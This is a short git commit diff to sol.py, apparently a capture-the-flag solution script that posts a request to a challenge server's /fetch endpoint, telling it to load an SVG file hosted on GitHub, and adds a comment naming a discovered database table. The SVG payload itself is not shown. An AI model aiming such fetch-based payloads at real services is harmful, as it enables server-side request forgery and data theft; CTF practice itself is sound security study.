fad2cce804ff2c8e1cf8c68a2fdab4fd4c9f013e
ilyeshaddad337 <i.haddad@esi-sba.dz>
2025-05-01 20:16:31 +0100

    s

--- sol.py
+++ sol.py
@@ -2,9 +2,10 @@ import requests
 
 url = "http://192.168.64.2:5000/fetch"
 url = "http://nexus-security.club:8001/fetch"
+# table name : _0dab7bad101846f6
 
 payload = {
-    "url": "https://raw.githubusercontent.com/Ilyeshaddad337/nexusctf/refs/heads/main/sol0.svg"
+    "url": "https://raw.githubusercontent.com/Ilyeshaddad337/nexusctf/refs/heads/main/sol000.svg"
 }
 headers = {
     "Content-Type": "application/x-www-form-urlencoded"
